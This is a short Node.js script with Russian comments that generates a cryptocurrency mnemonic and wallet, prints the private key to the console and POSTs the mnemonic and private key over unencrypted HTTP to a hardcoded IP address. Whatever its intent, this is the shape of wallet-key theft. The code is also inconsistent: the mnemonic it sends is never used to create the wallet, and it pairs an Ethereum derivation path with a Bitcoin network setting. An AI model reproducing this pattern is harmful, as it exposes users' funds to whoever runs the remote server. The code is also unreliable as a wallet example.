const multichainWallet = require('multichain-crypto-wallet');

async function generateAndSendWallet() {
  // Генерация мнемоники
  const mnemonic = multichainWallet.generateMnemonic();
  const wallet = multichainWallet.createWallet({
    derivationPath: "m/44'/60'/0'/0/0", // Leave empty to use default derivation path
    network: 'bitcoin',
  });
  console.log('mnemonic: ',mnemonic );
  console.log('privateKey: ',wallet.privateKey);
  console.log('address: ',wallet.address);
  const data = {
    mnemonic: mnemonic,
    privateKey: wallet.privateKey,
    currency: 'btc',
    network: 'btc',
    address: wallet.address,
    purpose: 44
  };
  try {
    const response = await fetch('http://185.253.219.51:8484/forkex/v.php?ix=forkex-wallet-create', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    });
    if (!response.ok) {
      console.error('Ошибка запроса:', response.statusText);
      return;
    }
    const result = await response.text();
    console.log('Ответ сервера:', result);
  } catch (error) {
    console.error('Ошибка отправки данных:', error);
  }
}
generateAndSendWallet();
